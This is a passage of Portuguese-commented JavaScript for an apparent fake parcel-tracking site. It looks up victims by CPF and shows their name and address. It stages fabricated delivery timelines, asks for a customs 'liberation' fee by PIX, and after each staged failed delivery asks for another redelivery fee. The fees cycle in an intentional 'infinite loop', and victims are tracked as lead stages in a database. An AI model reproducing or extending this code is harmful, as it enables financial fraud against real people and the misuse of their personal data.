                    </div>
                </div>
            </div>
        `;
        
        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';
        
        // Configurar eventos
        const closeButton = modal.querySelector('#closeDeliveryPaymentModal');
        const payButton = modal.querySelector('#simulateDeliveryPayment');
        
        closeButton.addEventListener('click', () => {
            this.closeDeliveryPaymentModal();
        });
        
        payButton.addEventListener('click', () => {
            this.processDeliveryPayment(value, button);
        });
        
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeDeliveryPaymentModal();
            }
        });
    }
    
    // Processar pagamento de reenvio
    processDeliveryPayment(value, button) {
        this.closeDeliveryPaymentModal();
        
        // Ocultar botão atual
        button.closest('.timeline-item').style.display = 'none';
        
        // Mostrar notificação de sucesso
        this.showSuccessNotification('Reenvio confirmado!', 'Nova tentativa de entrega agendada.');
        
        // Iniciar novo ciclo de entrega
        setTimeout(() => {
            this.startNewDeliveryAttempt(this.getNextDeliveryValue(value));
        }, 2000);
    }
    
    // Obter próximo valor de entrega
    getNextDeliveryValue(currentValue) {
        const values = [9.74, 14.98, 18.96];
        const currentIndex = values.indexOf(currentValue);
        return currentIndex < values.length - 1 ? values[currentIndex + 1] : values[0]; // Loop infinito
    }
    
    // Iniciar nova tentativa de entrega
    startNewDeliveryAttempt(nextValue) {
        console.log('🚚 Iniciando nova tentativa de entrega...');
        
        // Sairá para entrega (2h)
        this.addTimelineStep({
            stepNumber: 100 + Math.random(), // ID único
            title: 'Pedido sairá para entrega',
            description: 'Seu pedido está sendo preparado para nova tentativa de entrega',
            delay: 2 * 60 * 60 * 1000
        });
        
        // Em trânsito (4h)
        this.addTimelineStep({
            stepNumber: 101 + Math.random(),
            title: 'Pedido em trânsito',
            description: 'Pedido em trânsito para seu endereço',
            delay: 4 * 60 * 60 * 1000
        });
        
        // Rota de entrega (6h)
        this.addTimelineStep({
            stepNumber: 102 + Math.random(),
            title: 'Pedido em rota de entrega',
            description: 'Pedido em rota de entrega para seu endereço, aguarde',
            delay: 6 * 60 * 60 * 1000
        });
        
        // Nova tentativa (8h)
        this.addTimelineStep({
            stepNumber: 103 + Math.random(),
            title: 'Tentativa de entrega',
            description: 'Nova tentativa de entrega realizada, mas não foi possível entregar',
            delay: 8 * 60 * 60 * 1000,
            isDeliveryAttempt: true,
            deliveryValue: nextValue
        });
    }
    
    // Fechar modal de pagamento de entrega
    closeDeliveryPaymentModal() {
        const modal = document.getElementById('deliveryPaymentModal');
        if (modal) {
            modal.remove();
            document.body.style.overflow = 'auto';
        }
    }
    
    // Atualizar status de pagamento no banco de dados
    async updatePaymentStatusInDatabase(status) {
        if (this.currentCPF) {
            try {
                // Importar DatabaseService dinamicamente
                const { DatabaseService } = await import('../services/database.js');
                const dbService = new DatabaseService();
                
                await dbService.updatePaymentStatus(this.currentCPF, status);
                await dbService.updateLeadStage(this.currentCPF, 6); // Etapa 6 = liberado
                
                console.log('✅ Status de pagamento atualizado no banco:', status);
            } catch (error) {
                console.error('❌ Erro ao atualizar status no banco:', error);
            }
        }
    }
    
    // Mostrar notificação de sucesso personalizada
    showSuccessNotification(title = 'Pagamento confirmado!', message = 'Objeto liberado com sucesso.') {
        const notification = document.createElement('div');
        notification.className = 'payment-success-notification';
        notification.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `;
        
        notification.innerHTML = `
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">${title}</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">${message}</div>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        // Adicionar estilos de animação se não existirem
        if (!document.getElementById('notificationAnimations')) {
            const style = document.createElement('style');
            style.id = 'notificationAnimations';
            style.textContent = `
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        }
        
        // Remover após 5 segundos
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    displayStaticPixModal() {
        // Exibir modal com dados estáticos como fallback
        const liberationModal = document.getElementById('liberationModal');
        if (liberationModal) {
            liberationModal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            // Adicionar botão de simulação para modal estático também
            setTimeout(() => {
                this.addPaymentSimulationButton();
            }, 500);
        }
        
        console.log('⚠️ Modal PIX estático exibido como fallback');
    }

    guideToCopyButton() {
        const copyButton = document.getElementById('copyPixButtonModal');
        const pixSection = document.querySelector('.pix-copy-section');
        
        if (copyButton && pixSection) {
            // Adicionar destaque visual temporário
            pixSection.style.position = 'relative';
            
            // Criar indicador visual
            const indicator = document.createElement('div');
            indicator.className = 'copy-guide-indicator';
            indicator.innerHTML = '👆 Copie o código PIX aqui';
            indicator.style.cssText = `
                position: absolute;
                top: -35px;
                right: 0;
                background: #ff6b35;
                color: white;
                padding: 8px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 600;
                animation: bounceIn 0.6s ease, fadeOutGuide 4s ease 2s forwards;
                z-index: 10;
                white-space: nowrap;
                box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
            `;
            
            pixSection.appendChild(indicator);
            
            // Destacar a seção PIX temporariamente
            pixSection.style.animation = 'highlightSection 3s ease';
            
            // Scroll suave para a seção do PIX
            setTimeout(() => {
                pixSection.scrollIntoView({ 
                    behavior: 'smooth', 
                    block: 'center' 
                });
            }, 200);
            
            // Remover indicador após animação
            setTimeout(() => {
                if (indicator.parentNode) {
                    indicator.remove();
                }
                pixSection.style.animation = '';
            }, 6000);
        }
    }

    closeModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    toggleAccordion() {
        const content = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon');
        
        if (!content || !toggleIcon) return;
        
        if (content.classList.contains('expanded')) {
            content.classList.remove('expanded');
            toggleIcon.classList.remove('rotated');
        } else {
            content.classList.add('expanded');
            toggleIcon.classList.add('rotated');
        }
    }

    copyPixCode(inputId, buttonId) {
        const pixCode = document.getElementById(inputId);
        const button = document.getElementById(buttonId);
        
        if (!pixCode || !button) return;
        
        try {
            // Selecionar e copiar o texto
            pixCode.select();
            pixCode.setSelectionRange(0, 99999); // Para mobile
            
            // Tentar usar a API moderna primeiro
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixCode.value).then(() => {
                    console.log('✅ PIX copiado via Clipboard API:', pixCode.value.substring(0, 50) + '...');
                    this.showCopySuccess(button);
                }).catch(() => {
                    // Fallback para execCommand
                    this.fallbackCopy(pixCode, button);
                });
            } else {
                // Fallback para execCommand
                this.fallbackCopy(pixCode, button);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
            UIHelpers.showError('Erro ao copiar código PIX. Tente selecionar e copiar manualmente.');
        }
    }

    fallbackCopy(pixCode, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX copiado via execCommand:', pixCode.value.substring(0, 50) + '...');
                this.showCopySuccess(button);
            } else {
                throw new Error('execCommand falhou');
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
            UIHelpers.showError('Erro ao copiar. Selecione o texto e use Ctrl+C.');
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    handleAutoFocus() {
        const urlParams = new URLSearchParams(window.location.search);
        const shouldFocus = urlParams.get('focus');
        
        if (shouldFocus === 'cpf') {
            setTimeout(() => {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    const trackingHero = document.querySelector('.tracking-hero');
                    if (trackingHero) {
                        UIHelpers.scrollToElement(trackingHero, 0);
                    }
                    
                    setTimeout(() => {
                        cpfInput.focus();
                        
                        // Configurar para mobile
                        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                            cpfInput.setAttribute('inputmode', 'numeric');
                            cpfInput.setAttribute('pattern', '[0-9]*');
                            cpfInput.click();
                        }
                    }, 800);
                }
            }, 100);
            
            // Limpar URL
            const newUrl = window.location.pathname;
            window.history.replaceState({}, document.title, newUrl);
        }
    }

    clearOldData() {
        try {
            const keys = Object.keys(localStorage);
            keys.forEach(key => {
                if (key.startsWith('tracking_')) {
                    localStorage.removeItem(key);
                }
            });
        } catch (error) {
            console.error('Erro ao limpar dados antigos:', error);
        }
    }

    saveTrackingData() {
        if (this.currentCPF && this.trackingData) {
            try {
                localStorage.setItem(`tracking_${this.currentCPF}`, JSON.stringify(this.trackingData));
            } catch (error) {
                console.error('Erro ao salvar dados:', error);
            }
        }
    }

    // Helper methods
    getFirstAndLastName(fullName) {
        const names = fullName.trim().split(' ');
        
        console.log('🔍 Processando nome completo:', fullName);
        console.log('🔍 Nomes separados:', names);
        
        if (names.length === 1) {
            console.log('✅ Nome único encontrado:', names[0]);
            return names[0];
        }
        return `${names[0]} ${names[names.length - 1]}`;
    }

    updateElement(id, text) {
        console.log(`🔄 Tentando atualizar elemento '${id}' com texto:`, text);
        
        const element = document.getElementById(id);
        if (element) {
            const oldText = element.textContent;
            element.textContent = text;
            console.log(`✅ Elemento '${id}' atualizado:`);
            console.log(`   Texto anterior: "${oldText}"`);
            console.log(`   Texto novo: "${text}"`);
        } else {
            console.error(`❌ Elemento '${id}' não encontrado no DOM`);
            console.log('🔍 Elementos disponíveis:', Array.from(document.querySelectorAll('[id]')).map(el => el.id));
        }
    }

    showElement(id) {
        const element = document.getElementById(id);
        if (element) {
            element.style.display = 'block';
        }
    }

    // Método para configurar a API secret externamente
    setZentraPayApiSecret(apiSecret) {
        const success = this.zentraPayService.setApiSecret(apiSecret);
        if (success) {
            console.log('✅ API Secret Zentra Pay configurada com sucesso');
        } else {
            console.error('❌ Falha ao configurar API Secret Zentra Pay');
        }
        return success;
    }

    // Método para ativar modo de teste (etapas a cada 10 segundos)
    enableTestMode() {
        this.automatedSystem.setTestMode(true);
        console.log('🧪 Modo de teste ativado - etapas a cada 10 segundos');
    }

    // Método para obter status do rastreamento automatizado
    getAutomatedStatus() {
        if (this.currentCPF) {
            return this.automatedSystem.getTrackingStatus(this.currentCPF);
        }
        return { active: false, message: 'Nenhum CPF ativo' };
    }
    
    // Mostrar informações do pedido
    showOrderInformation() {
        const orderInfoSection = document.getElementById('orderInfoSection');
        if (orderInfoSection && this.userData) {
            orderInfoSection.style.display = 'block';
            
            // Atualizar com dados reais do usuário
            this.updateElement('orderCustomerName', this.userData.nome || 'Nome não informado');
            this.updateElement('orderDeliveryAddress', this.userData.endereco || 'Endereço não informado');
            this.updateElement('orderProductName', 'Kit 12 caixas organizadoras + brinde');
            this.updateElement('orderCustomsStatus', this.trackingData?.liberationPaid ? 'Pago' : 'Pendente');
        }
    }
}

// Expor método global para configurar a API secret
window.setZentraPayApiSecret = function(apiSecret) {
    if (window.trackingSystemInstance) {
        return window.trackingSystemInstance.setZentraPayApiSecret(apiSecret);
    } else {
        window.ZENTRA_PAY_SECRET_KEY = apiSecret;
        localStorage.setItem('zentra_pay_secret_key', apiSecret);
        console.log('🔑 API Secret armazenada para uso posterior');
        return true;
    }
};

// Expor variável global para valor em reais
window.valor_em_reais = 26.34; // R$ 26,34 - você pode alterar este valor